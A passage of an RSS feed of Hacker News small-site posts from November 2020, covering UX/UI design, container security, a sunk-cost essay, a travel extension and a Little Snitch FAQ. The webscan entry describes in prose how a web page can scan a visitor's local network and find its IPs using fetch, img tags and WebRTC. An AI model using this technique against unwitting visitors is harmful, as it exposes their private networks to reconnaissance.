doesn’t invent anything brand new. They search for successful designs and borrow the coolest ideas as a basis for their own designs.</p><figure id="w-node-258cede51aef-7a0a8b78"><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90e6b6027e74c/5f6ccc274b5010826697596d_5cf66efa7143343d7a54dea6_profile.png" loading="lazy" alt=""></p></figure><h4>What does the UI designer do?</h4><p>The UI designer transforms the UX designer’s insights into visual elements and images. They’re responsible for how users feel about the product from the visual point of view.</p><p>A UI designer’s work is to tell a story. A user should completely understand how to use an application or a website without any effort and should know where to click and how to find something.</p><figure id="w-node-593dff4b66b7-7a0a8b78"><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90e6b6027e74c/5d4ac8f33016685a6fb08206_8.png" alt=""></p></figure><p>We hope that you now better understand the differences between UX and UI design and what role they play in product development. Check out some great examples of <a href="https://blog.ego-cms.com/works/">UX and UI design </a>and feel free to request samples of designs we’ve made for businesses like yours!</p><figure><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90e6b6027e74c/5f6ccc4e2bcee2554ab09a16_5d30457c6feb9f41d734124a_Product%20Design.png" loading="lazy" alt=""></p></figure></div></article><section><div><div><p>LIKE THIS ARTICLE? Help us SPREAD THE WORD.</p></div></div></section></div>]]>
            </description>
            <link>https://www.ego-cms.com/post/ui-ux-what-is</link>
            <guid isPermaLink="false">hacker-news-small-sites-25140846</guid>
            <pubDate>Wed, 18 Nov 2020 18:58:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Prolog implementation of the Knuth-Bendix completion procedure]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25140710">thread link</a>) | @carapace
<br/>
November 18, 2020 | https://www.metalevel.at/trs/ | <a href="https://web.archive.org/web/*/https://www.metalevel.at/trs/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.metalevel.at/trs/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25140710</guid>
            <pubDate>Wed, 18 Nov 2020 18:49:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Samy Kamkar – webscan: web-based network scanner]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25140408">thread link</a>) | @jeroenhd
<br/>
November 18, 2020 | http://samy.pl/webscan/ | <a href="https://web.archive.org/web/*/http://samy.pl/webscan/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">



<p>
<a href="https://samy.pl/webscan">webscan</a> is a browser-based network IP scanner and local IP detector. It detects IPs bound to the user/victim by listening on an RTP data channel via WebRTC and looping back to the port across any live IPs, as well as discovering all live IP addresses on valid subnets by monitoring for immediate timeouts (TCP RST packets returned) from <a target="_new" href="https://fetch.spec.whatwg.org/">fetch()</a> calls or hidden <i>img</i> tags pointed to valid subnets/IPs. Works on mobile and desktop across all major browsers and OS's. Beta version is extensible to allow the addition of multiple techniques.
</p><p>
webscan takes advantage of the fact that non-responsive img tag sockets can be closed to prevent browser &amp; network-based rate limiting by altering the src attribute to a non-socket URI (removing from DOM ironically does not close the socket), or by using fetch()'s signal support of the <a target="_new" href="https://dom.spec.whatwg.org/#interface-abortcontroller">AbortController()</a> interface.

<!--<p><a href="https://samy.pl/webscan/">try webscan live here</a><br></p>-->

</p><p>by <a target="_new" href="https://twitter.com/samykamkar">@SamyKamkar</a><br>
released 2020/11/07<br>
source code: <a target="_new" href="https://github.com/samyk/webscan">github.com/samyk/webscan</a><br>
beta version: <a href="https://samy.pl/webscan/beta.html">samy.pl/webscan/beta</a><br>
more fun projects at <a href="https://samy.pl/">samy.pl</a><br></p>

<pre id="content"></pre>



<p>webscan works like so</p>

<ol>
<li>webscan first iterates through a list of common gateway IP addresses</li>
<li>for each IP, use fetch() or img tag to make fake HTTP connection to http://common.gateway.ip:1337</li>
<li>if a TCP RST returns, the fetch() promise will be rejected or img tag onerror will trigger before a timeout, indicating a live IP</li>
<li>to prevent browser or network rate limiting, non-responsive fetch() sockets are closed via AbortController() signal while img-tags have the src redirected to non-socket URI, closing the socket</li>
<li>when live gateway detected, step 1-3 reran for every IP on the subnet (<i>e.g. 192.168.0.[1-255]</i>)</li>
<li>a WebRTC data channel is opened on the browser, opening a random port on the victim machine</li>
<li>for any IPs that are found alive on the subnet, a WebRTC data channel connection is made to that host</li>
<li>if the WebRTC data channel is successful, we know we just established a connection to our own local IP</li>
</ol>


<p>Tested on</p>
<ul>
  <li>Chrome 87.0.4280.47 (macOS)</li>
  <li>Edge 86.0.622.63 (Windows)</li>
  <li>Firefox 82.0.2 (macOS)</li>
  <li>Firefox 82.0.2 (Windows 10)</li>
  <li>Safari 13.1.2 (macOS)</li>
  <li>mobile Safari (iOS)</li>
  <li>mobile Chrome (iOS)</li>
</ul>










</div>]]>
            </description>
            <link>http://samy.pl/webscan/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25140408</guid>
            <pubDate>Wed, 18 Nov 2020 18:27:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Practical Introduction to Container Security]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25140149">thread link</a>) | @kiyanwang
<br/>
November 18, 2020 | https://cloudberry.engineering/article/practical-introduction-container-security/ | <a href="https://web.archive.org/web/*/https://cloudberry.engineering/article/practical-introduction-container-security/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
    <div>
        <div>
            <p>Securing containers is a complex task.  The problem space is broad, vendors are on fire, there are tons of checklists and best practices and it’s hard to prioritize solutions. So if you had to <strong>implement a container security strategy</strong> where would you start?</p>

<p>I suggest to start from the basics: understanding <strong>what container security is about</strong> and build a model to navigate risks.</p>

<h2 id="follow-the-devops-life-cycle">Follow the DevOps Life Cycle</h2>

<p>Every security initiative is eventually constrained by where security controls can be implemented, so I find practical to just follow the standard DevOps life cycle to <em>surface patterns™</em> and <em>unlock synergies™</em>.</p>

<p>The DevOps Lifecycle is an infinite iteration of:</p>

<ul>
<li>Plan</li>
<li>Code</li>
<li>Build</li>
<li>Test</li>
<li>Release</li>
<li>Deploy</li>
<li>Operate</li>
<li>Monitor</li>
</ul>

<p><img src="https://cloudberry.engineering/devops-lifecycle.jpg" alt="DevOps Lifecycle - source: ryadel.com"></p>

<p>Containers are included in the application in the form of a Dockerfiles but are not really part of it. As such they don’t interest the planning and coding phase.</p>

<p><em>(no, writing Dockerfiles is not coding.)</em></p>

<p>Every other step is in scope from a security point of view, and I would group them like this:</p>

<ul>
<li><strong>Build Time</strong>: build, test and release.</li>
<li><strong>Container Infrastructure</strong>: deploy and operate.</li>
<li><strong>Runtime</strong>: monitor.</li>
</ul>

<p>Why? Every security strategy is only effective if it can be implemented. And every step in each group share a common facility where security controls can be injected without adding much friction:</p>

<ul>
<li>Build Time: The CI/CD infrastructure, the container registry</li>
<li>Container Infrastructure: the container orchestrator</li>
<li>Runtime: the production environment</li>
</ul>

<p>Now we have three macro areas we can use as a starting point to do our risk assessments.</p>

<h2 id="security-at-build-time">Security at Build Time</h2>

<p>At build time we have in input a bunch of source files and a Dockerfile, and we get as output a Docker image.</p>

<p>This is where most vendors tend to cluster while trying to sell you the narrative of the importance of scanning container images and calling it a day.  Container security scanning is important, yes, but it’s not enough.</p>


<div>
<p><strong>This stage goal</strong>:</p>

<ul>
<li>minimize the risk of supply chain attacks.</li>
</ul>
</div>


<h3 id="container-images-hygiene">Container Images Hygiene</h3>

<p>First, decide how your images should look like, with a focus on how software dependencies are introduced:</p>

<ul>
<li>what base images are developers allowed to use?</li>
<li>are software dependencies pinned? From where are they pulled?</li>
<li>are there any labels that are needed to simplify governance and compliance?</li>
<li>lint the Dockerfile</li>
<li>follow <a href="https://cloudberry.engineering/article/dockerfile-security-best-practices/">Docker security best practices</a> when writing Dockerfiles</li>
</ul>

<p>All of these checks are static and can be implemented for cheap as a step in the build pipelines.</p>

<h3 id="container-images-scanning">Container Images Scanning</h3>

<p>Then we can move into scanning the container image.</p>

<p><strong>Do not scan the image as a step in the build pipeline</strong>, instead setup continuous scanning in the container registry.</p>

<p>Why? Vulnerabilities are continuously discovered while your services are not necessarily continuously built. Secondly, builds are additive: every build will generate a new image. So, assuming  your container orchestrator trust your registry, every tag you publish can always be deployed and need to be assessed.</p>

<p><em>(It’s also very slow to scan at build time)</em></p>

<p>This is where you start thinking about defining <strong>patch management</strong> and <strong>shelf life</strong> processes:</p>

<ul>
<li>patch management: results from the scanning will feed a patching process that will result in a new version of the image</li>
<li>shelf life: unpatched/old/unsafe images are deleted from the registry</li>
</ul>

<p><em>(next article will be about how to choose a container scanning solution, if you are facing the dilemma right now feel free to <a href="mailto:hello@clouberry.engineering">ping me</a>)</em></p>

<h2 id="container-infrastructure-security">Container Infrastructure Security</h2>

<p>The container infrastructure is comprised of all the moving parts that are in charge of pulling your images from the registry and run them as containers in production.</p>

<p>It’s mostly going to be the container orchestrator – <em>*cough* kubernetes *cough*</em>.</p>


<div>
<p><strong>This stage goals</strong>:</p>

<ul>
<li>Avoid platform misconfigurations with security implications</li>
<li>Minimize the <strong>breadth</strong> of an attack from a compromised container</li>
</ul>
</div>


<h3 id="security-of-the-infrastructure-misconfigurations">Security OF the Infrastructure: Misconfigurations</h3>

<p>Container orchestrators are complex, Kubernetes in particular. As of now they fail the promise of DevOps and I think we are still an abstraction layer (or two) away from being a mainstream solution without too much operational overhead.</p>

<p>Every complex platforms is prone to be misconfigured, and this is the part you want to focus on.</p>

<p>You have to threat model your infrastructure to <strong>ensure it can’t be abused</strong>.
This particular thread model should focus on every actor but a compromised container (we will cover that next).</p>

<p>I can’t go into details here, because it really depends on what you are running. For Kubernetes a good starting point for threat modelling is <a href="https://www.marcolancini.it/2020/blog-kubernetes-threat-modelling/">this</a>.</p>

<p>Additionally, if you are not doing it yet, this is also a <strong>good argument in favour of using a managed platform</strong>: the complexity is reduced if you can leverage a shared responsibility model with your (trusted) provider.</p>

<h3 id="security-in-the-infrastructure-lateral-movements">Security IN the infrastructure: Lateral Movements</h3>

<p>Next we can talk about what happens when a container is compromised.</p>

<p>You want to minimize the <a href="https://cloudberry.engineering/article/lateral-movement-cloud/">attacker’s ability to move laterally</a>, focusing on these two layers:</p>

<ul>
<li>The network layer</li>
<li>The Identity and Access management (IAM) layer</li>
</ul>

<p><strong>The network should not be flat</strong>. You can start by brutally segment everything into subnetworks and work your way up to a full fledge service meshes.</p>

<p>On the IAM layer work your way toward having a <strong>single identity for each container</strong> in order to fine tune the authorization grants. This is particularly important in multi tenant platforms: without granular identities it’s impossible to achieve least privilege.</p>

<p><em>(Google Kubernetes Engine (GKE) has a nifty feature for this called <a href="https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity">Workload Identity</a>)</em></p>

<p>Finally, since they are supposed to be immutable, a wonderful strategy would be to <strong>reduce the amount of time containers can run</strong>: the window of opportunity for attackers to move laterally and gain persistence is as long as the container running lifetime. Continously shut down and spin up your containers.</p>

<p>And this final consideration allow me to smoothly move into the next area.</p>

<h2 id="runtime-security">Runtime Security</h2>

<p>The last piece of the puzzle is the security of your running workloads.
At this point most of the hardening is done and here is when we move into the realm of reactive security controls, the grim land of <strong>post-fail</strong>.</p>


<div>
<p><strong>This stage goal</strong>:</p>

<ul>
<li>is to minimize the <strong>impact</strong> of an attack from a compromised container.</li>
</ul>
</div>


<h3 id="detection-and-incident-response">Detection and Incident Response</h3>

<p>The best way to control the impact of an attack is to minimize the time between the breach to when the security team is alerted.</p>

<p>Detecting an ongoing breach is another area where vendors are scrambling to find a silver bullet. There are many approaches, most of them will require side cars and/or daemon sets actively monitoring pod’s traffic and system calls.</p>

<p>Most solutions will provide some value but my advice is to start simple and iterate: use your existing SIEM, ingest your platform, application and audit logs.</p>

<p><strong>Incidents will happen</strong>, and it’s fine: have an incident response process.</p>

<p>The first bullet point of every post-mortem should be: <em>“how can we detect this quicker next time?”</em> answering will allow you to identify your blind spots, which you can then use to understand what signals you are missing and what makes sense to buy.</p>

<h2 id="conclusion">Conclusion</h2>

<p>Container security is a broad problem and it is not just about scanning images.</p>

<p>This is the model I built and used to reason about container risks and solutions. It’s very high level and of course, as with every model, <strong>it’s not necessarily the right one</strong>.</p>

<p>We all know that in reality each infrastructure is a snowflake: so start with your own threat model and use this one <strong>as an inspiration</strong>.</p>
        </div>
        
    </div>
</section></div>]]>
            </description>
            <link>https://cloudberry.engineering/article/practical-introduction-container-security/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25140149</guid>
            <pubDate>Wed, 18 Nov 2020 18:10:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Nice Picture of the Milky Way]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25139966">thread link</a>) | @jayass
<br/>
November 18, 2020 | https://misspellede.com/us/a-glowing-steve-and-the-milky-way/ | <a href="https://web.archive.org/web/*/https://misspellede.com/us/a-glowing-steve-and-the-milky-way/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        <div> 
                            <p><img loading="lazy" src="https://apod.nasa.gov/apod/image/2011/SteveMilkyWay_NasaTrinder_960.jpg" alt="A Glowing STEVE and the Milky Way cover image"></p>
            <p><a href="https://misspellede.com/us/cosmos/">cosmos</a></p><p> • 2020-11-17</p><p>What's creating these long glowing streaks in the sky? No one is sure.  Known as Strong Thermal Emission Velocity Enhancements (STEVEs), these luminous light-purple sky ribbons may resemble regular auroras, but recent research reveals significant differences. A STEVE's great length and unusual colors, when measured precisely, indicate that it may be related to a subauroral ion drift (SAID), a supersonic river of hot atmospheric ions thought previously to be invisible.  Some STEVEs are now also thought to be accompanied by green picket fence structures, a series of sky slats that can appear outside of the main auroral oval that does not involve much glowing nitrogen. The featured wide-angle composite image shows a STEVE in a dark sky above Childs Lake, Manitoba, Canada in 2017, crossing in front of the central band of our Milky Way Galaxy.</p>

        </div>
    </article></div>]]>
            </description>
            <link>https://misspellede.com/us/a-glowing-steve-and-the-milky-way/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25139966</guid>
            <pubDate>Wed, 18 Nov 2020 17:57:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Beautiful Hand Drawn Letters]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25139723">thread link</a>) | @moxylush
<br/>
November 18, 2020 | https://neodigm.github.io/vivid_vector_alphabet/ | <a href="https://web.archive.org/web/*/https://neodigm.github.io/vivid_vector_alphabet/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://neodigm.github.io/vivid_vector_alphabet/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25139723</guid>
            <pubDate>Wed, 18 Nov 2020 17:40:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Indie Makers and the Sunk Cost Fallacy]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25139722">thread link</a>) | @christian_fei
<br/>
November 18, 2020 | https://cri.dev/posts/2020-11-18-Indie-makers-and-the-Sunk-Cost-Fallacy/ | <a href="https://web.archive.org/web/*/https://cri.dev/posts/2020-11-18-Indie-makers-and-the-Sunk-Cost-Fallacy/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody"><p>The Sunk Cost Fallacy is a <a href="https://cri.dev/cdn-cgi/l/email-protection" data-cfemail="f89ac7b8">[email&nbsp;protected]</a>#$.</p><p><strong>It's a cost that you sustained in the past (be it time, money, energy, whatever) and cannot be reversed, cancelled or undone.</strong></p><p>The fallacy is that yet <em>knowing about the sunk cost of a project</em>, you are often tempted to <em>justify your future investments</em> because of your past (most likely lost) investments.</p><p>The sunk cost <em>should not influence your future decisions</em>, yet it does. And the outcomes are often delusion, sadness and stress.</p><hr><h2>Cut your losses</h2><p>You might get <em>emotionally</em> attached to your projects.</p><p>Your idea "is awesome!", yet your <strong>expectations</strong> are not met by others.</p><p>You can't possibly understand why your project doesn't do as well as you have <strong>hoped</strong>.</p><p>You spent the last month <em>contacting potential clients, shipped v1/v2/v3/Beta1 and Beta2, optimized your landing page to maximize conversions</em>.</p><p>Yet nobody gives <em>a flying fuck</em> about your project, although your research and feedback received.</p><p><strong>This is when you should cut your losses.</strong></p><h2>Move on</h2><p>It's perfectly normal to feel stressed/disappointed when you need to cut your losses and move on.</p><p><strong>But you need to realize it.</strong></p><p>If you don't realize it, or realize it too late, <em>you get burned</em>.</p><p><strong>You get burned by your own emotional decisions, which should have been rational all along.</strong></p><p><strong>It's business decision making after all.</strong></p><blockquote><p>It's not kindergarten where you just cry out loud and a nanny comes to cheer you up and console you.</p></blockquote><p><em>Just move on.</em></p><p>It seemed a good idea in theory, but people have better things to do than to <em>feel pity over your failure</em>.</p><p><strong>And you do too.</strong></p><h2>Learn from your mistakes</h2><p>You have nothing left to do than to learn from what you did <strong>wrong</strong>.</p><blockquote><p>Write it down.</p><p>Visualize the process you followed.</p><p>Maybe it wasn't that good after all.</p></blockquote><p>Did you first of all understood that there was a real <em>value</em> for your potential customers, or you just thought <em>people would donate you money</em> because you spent months on your pretty project?</p><p>As you might have noticed, <strong>You</strong> is mentioned quite a few times in this post.</p><p><em>This should make you reflect.</em></p><p>It's not about you, but about <strong>market, niches, interests, potential clients, value proposition, communication, marketing, connections, content.</strong></p></div></div>]]>
            </description>
            <link>https://cri.dev/posts/2020-11-18-Indie-makers-and-the-Sunk-Cost-Fallacy/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25139722</guid>
            <pubDate>Wed, 18 Nov 2020 17:40:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Missing traveling during Covid? Travel virtually with this extension]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25139417">thread link</a>) | @itsjustrahul
<br/>
November 18, 2020 | https://www.withaview.co/ext/ | <a href="https://web.archive.org/web/*/https://www.withaview.co/ext/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    

    <div id="face">
      <div>
        

        <div>
          <div>
            

            <div>
              <!-- <div class="custom-face-main-description-container"> -->
              <div>
                <div>
                  <p>
                    Travel virtually<br>
                    to the most beautiful places<br>
                    on this planet<br>
                  </p>
                  <p>Everyday go somewhere awesome<br>
                    with a view at <b>each browser tab.</b></p>
                  <p><a href="https://chrome.google.com/webstore/detail/mlhimllheakianplccjmedmiabppmeaj" target="_blank" rel="noopener" name="addToStoreLink">
                    <img id="browserIconHero" src="https://www.withaview.co/ext/static/icon-google-chrome-white.svg" decoding="async" importance="low">
                    <label name="extButtonText"></label>
                  </a></p>
                </div>
                <div>
                  
<!--                  <img src="./static/new-tabs-800w.gif" height="auto" width="100%" /> -->

                    <p><iframe src="https://player.vimeo.com/video/478850115?autoplay=0&amp;title=0&amp;byline=0&amp;portrait=0" frameborder="0" allow="autoplay; fullscreen" allowfullscreen=""></iframe></p>
                    


                </div>
              </div>
            </div>

            <div>
              

              <p><img src="https://www.withaview.co/ext/static/icon-down-arrow.svg" decoding="async" importance="low">
              </p>
            </div>
          </div>

          <div>
            <div>
              
              <p><a href="https://www.producthunt.com/posts/tab-with-a-view?utm_source=badge-featured&amp;utm_medium=badge&amp;utm_souce=badge-tab-with-a-view" target="_blank" rel="noopener">
                <img src="https://api.producthunt.com/widgets/embed-image/v1/featured.svg?post_id=274077&amp;theme=dark" alt="Tab with a view - Travel virtually to the most beautiful places on this planet | Product Hunt" width="246px" height="50px" decoding="async" importance="low">
              </a>
            </p></div>
            
          </div>
        </div>
      </div>

      <div id="mobile-description">
        <div>
          <p>
            Go somewhere awesome everyday
          </p>

          <p><span>with</span>
            <img src="https://www.withaview.co/ext/static/logo-purple.svg" decoding="async" importance="high">
            <span>view</span>
          </p>

          <p>
            on a new Chrome or Edge tab
          </p>
        </div>
      </div>

      <div id="email-5">
        <div>
          <p>
            Tab with A view works only on desktop / laptop with Chrome or Edge browser.
          </p>

          <p>
            Send an email with a download link:
          </p>

          

          <p id="email-form-welcome-message-5">
            <span>Thank you.</span> You should receive an email in the next few minutes.
          </p>
        </div>
      </div>

      <div id="mobile-feature-1">
        <div>
          <p>
              Discover
              <br>
              Bars with A view
            </p>

          <p>
              You are holding your favorite drink while gazing upon the stunning natural views. It’s worth every moment.
              You deserve it!
            </p>
        </div>
      </div>

      <div id="email-1">
        <div>
          <p>
            Tab with A view works only on desktop / laptop with Chrome or Edge browser.
          </p>

          <p>
            Send an email with a download link:
          </p>

          

          <p id="email-form-welcome-message-1">
            <span>Thank you.</span> You should receive an email in the next few minutes.
          </p>
        </div>
      </div>

      <div id="mobile-feature-2">
        <div>
          <p>
              Explore
              <br>
              Restaurants with A view
            </p>

          <p>
              Just taking a break from work, enjoying your holidays or trying to impress your date, dining with a
              beautiful view is always the best decision.
            </p>
        </div>
      </div>

      <div id="email-2">
        <div>
          <p>
            Tab with A view works only on desktop / laptop with Chrome or Edge browser.
          </p>

          <p>
            Send an email with a download link:
          </p>

          

          <p id="email-form-welcome-message-2">
            <span>Thank you.</span> You should receive an email in the next few minutes.
          </p>
        </div>
      </div>

      <div id="mobile-feature-3">
        <div>
          <p>
              Uncover
              <br>
              Pools with A view
            </p>

          <p>
              There is nothing more relaxing than dipping your soul in an infinity pool with a never-ending view.
            </p>
        </div>
      </div>

      <div id="email-3">
        <div>
          <p>
            Tab with A view works only on desktop / laptop with Chrome or Edge browser.
          </p>

          <p>
            Send an email with a download link:
          </p>

          

          <p id="email-form-welcome-message-3">
            <span>Thank you.</span> You should receive an email in the next few minutes.
          </p>
        </div>
      </div>

      <div id="mobile-feature-4">
        <div>
          <p>
              Discover
              <br>
              Hotels with A view
            </p>

          <p>
              Wanna wake up to the chirping sounds of birds &amp; a soul touching beautiful view from your hotel room.
            </p>
        </div>
      </div>

      <div id="email-4">
        <div>
          <p>
            Tab with A view works only on desktop / laptop with Chrome or Edge browser.
          </p>

          <p>
            Send an email with a download link:
          </p>

          

          <p id="email-form-welcome-message-4">
            <span>Thank you.</span> You should receive an email in the next few minutes.
          </p>
        </div>
      </div>

      <!-- Section 1 -->
      <div id="feature-1">
        <div>
          <div>
            <div>
              <p><iframe src="https://player.vimeo.com/video/476876022?autoplay=0&amp;title=0&amp;byline=0&amp;portrait=0" frameborder="0" allow="autoplay; fullscreen" allowfullscreen=""></iframe></p>
              
            </div>
            <div>
              <p>

                Look out of someone else's window located somewhere else in the world
              </p>
              <p>
                Videos with ambience sound let you experience the life of someone else
              </p>
              <p><a href="https://chrome.google.com/webstore/detail/mlhimllheakianplccjmedmiabppmeaj" target="_blank" rel="noopener" name="addToStoreLink">
                <img name="browserIcon" src="https://www.withaview.co/ext/static/icon-google-chrome-black.svg" decoding="async" importance="low">
                <label name="extButtonText"></label>
              </a></p>
            </div>
          </div>
          <p><img src="https://www.withaview.co/ext/static/icon-down-arrow.svg" decoding="async" importance="low">
          </p>
        </div>
      </div>

      <!-- Section 2 -->
      <div id="feature-2">
        <div>
          <div>
            <div>
              <p>
                Discover the world’s most beautiful places with A view
              </p>
              <p>
                Bars, Restaurants, Hotels, Airbnbs, Spots with a view
              </p>
              <p><a href="https://chrome.google.com/webstore/detail/mlhimllheakianplccjmedmiabppmeaj" target="_blank" rel="noopener" name="addToStoreLink">
                <img name="browserIcon" src="https://www.withaview.co/ext/static/icon-google-chrome-black.svg" decoding="async" importance="low">
                <label name="extButtonText"></label>
              </a></p>
            </div>
            <p><img src="https://www.withaview.co/ext/static/bar.jpg">
            </p>
          </div>
          <p><img src="https://www.withaview.co/ext/static/icon-down-arrow.svg" decoding="async" importance="low">
          </p>
        </div>
      </div>

      <!-- Section 3 -->
      <div id="feature-3">
        <div>
          <div>
            <div>
              <p><iframe src="https://player.vimeo.com/video/477339201?autoplay=0&amp;title=0&amp;byline=0&amp;portrait=0" frameborder="0" allow="autoplay; fullscreen" allowfullscreen=""></iframe></p>
              
            </div>
            <div>
              <p>

                Virtually walk around the beautiful places
              </p>
              <p>
                Use 'Virtual tour' option to explore the area around
              </p>
              <p><a href="https://chrome.google.com/webstore/detail/mlhimllheakianplccjmedmiabppmeaj" target="_blank" rel="noopener" name="addToStoreLink">
                <img name="browserIcon" src="https://www.withaview.co/ext/static/icon-google-chrome-black.svg" decoding="async" importance="low">
                <label name="extButtonText"></label>
              </a></p>
            </div>
          </div>
          <p><img src="https://www.withaview.co/ext/static/icon-down-arrow.svg" decoding="async" importance="low">
          </p>
        </div>
      </div>

      <!-- Section 4 -->
      <div id="feature-4">
        <div>
          <div>
            <div>
              <p>
                Fly virtually over any spot on this planet
              </p>
              <p>
                Try 'Drone view' to fly over the spot from any perspective of your choice
              </p>
              <p><a href="https://chrome.google.com/webstore/detail/mlhimllheakianplccjmedmiabppmeaj" target="_blank" rel="noopener" name="addToStoreLink">
                <img name="browserIcon" src="https://www.withaview.co/ext/static/icon-google-chrome-black.svg" decoding="async" importance="low">
                <label name="extButtonText"></label>
              </a></p>
            </div>
            <p><img src="https://www.withaview.co/ext/static/drone-view.gif">
            </p>
          </div>
          <p><img src="https://www.withaview.co/ext/static/icon-down-arrow.svg" decoding="async" importance="low">
          </p>
        </div>
      </div>

      <!-- Section 5 -->
      <div id="feature-5">
        <div>
          <div>
            <p><img src="https://www.withaview.co/ext/static/visa.jpg">
            </p>
            <div>
              <p>
                Live flight prices &amp; handy Visa info
              </p>
              <p>
                Know instantly if you need a visa and always get the cheapest fligh prices from your nearest airport
              </p>
              <p><a href="https://chrome.google.com/webstore/detail/mlhimllheakianplccjmedmiabppmeaj" target="_blank" rel="noopener" name="addToStoreLink">
                <img name="browserIcon" src="https://www.withaview.co/ext/static/icon-google-chrome-black.svg" decoding="async" importance="low">
                <label name="extButtonText"></label>
              </a></p>
            </div>
          </div>
          <p><img src="https://www.withaview.co/ext/static/icon-down-arrow.svg" decoding="async" importance="low">
          </p>
        </div>
      </div>


      <!-- Section 6 -->
      <div id="feature-6">
        <div>
          <div>
            <div>
              <p>

                Realtime Covid-19 info for every spot
              </p>
              <p>
                Instant access to covid information for all the places your discover
              </p>
              <p><a href="https://chrome.google.com/webstore/detail/mlhimllheakianplccjmedmiabppmeaj" target="_blank" rel="noopener" name="addToStoreLink">
                <img name="browserIcon" src="https://www.withaview.co/ext/static/icon-google-chrome-black.svg" decoding="async" importance="low">
                <label name="extButtonText"></label>
              </a></p>
            </div>
            <p><img src="https://www.withaview.co/ext/static/covid-info.jpg">
            </p>
          </div>
          <p><img src="https://www.withaview.co/ext/static/icon-down-arrow.svg" decoding="async" importance="low">
          </p>
        </div>
      </div>

      <!-- Section 7 -->
      <div id="feature-7">
        <div>
          <div>
            <p><img src="https://www.withaview.co/ext/static/travel-list.jpg">
            </p>
            <div>
              <p>
                Create travel list for post corona plans
              </p>
              <p>
                Save favorite spots to your travel list for post corona travel plans in your profile section
              </p>
              <p><a href="https://chrome.google.com/webstore/detail/mlhimllheakianplccjmedmiabppmeaj" target="_blank" rel="noopener" name="addToStoreLink">
                <img name="browserIcon" src="https://www.withaview.co/ext/static/icon-google-chrome-black.svg" decoding="async" importance="low">
                <label name="extButtonText"></label>
              </a></p>
            </div>
          </div>
        </div>
      </div>


      
  </div></div></div>]]>
            </description>
            <link>https://www.withaview.co/ext/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25139417</guid>
            <pubDate>Wed, 18 Nov 2020 17:17:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Scratch.js – Interactive JavaScript Scratchpad]]>
            </title>
            <description>
<![CDATA[
Score 164 | Comments 65 (<a href="https://news.ycombinator.com/item?id=25138872">thread link</a>) | @kahole
<br/>
November 18, 2020 | https://hole.dev/scratch/ | <a href="https://web.archive.org/web/*/https://hole.dev/scratch/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://hole.dev/scratch/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25138872</guid>
            <pubDate>Wed, 18 Nov 2020 16:39:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Bypass Apple's Leaky Network Extension API with Little Snitch 4.6]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25138727">thread link</a>) | @miles
<br/>
November 18, 2020 | https://www.obdev.at/support/littlesnitch/245913651253917 | <a href="https://web.archive.org/web/*/https://www.obdev.at/support/littlesnitch/245913651253917">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div>
<p><label for="ctr_expandable_63">
<h3>Can Little Snitch 4 be installed on macOS 11 Big Sur?</h3>
</label></p><div>
<p>Little Snitch 4 needs to install a <em>Network Kernel Extension</em> in order to perform its network traffic filtering. This kind of kernel extension is no longer supported on macOS Big Sur. The operating system now refuses to load such kernel extensions by default.</p>
<p>The latest <a href="https://www.obdev.at/products/littlesnitch/download.html">version 5 of Little Snitch</a> no longer uses this unsupported Kernel API. It uses the newer System Extension API provided by Apple and is therefore fully compatible with macOS Big Sur.</p>
<p>Alternatively, it’s currently still possible to manually approve the loading of particular kernel extensions. This requires to start up your computer from macOS Recovery and enter a Terminal command to grant the necessary permission. However, Apple may remove this possibility at any time with a future update of macOS Big Sur.</p>
<ol>
<li>
<p><a href="https://support.apple.com/en-us/HT201314">Start up your computer from macOS Recovery</a>: Restart your computer and hold Command-R during startup.</p>
</li>
<li>
<p>Open the Terminal application from the Utilities menu in the menu bar.</p>
</li>
<li>
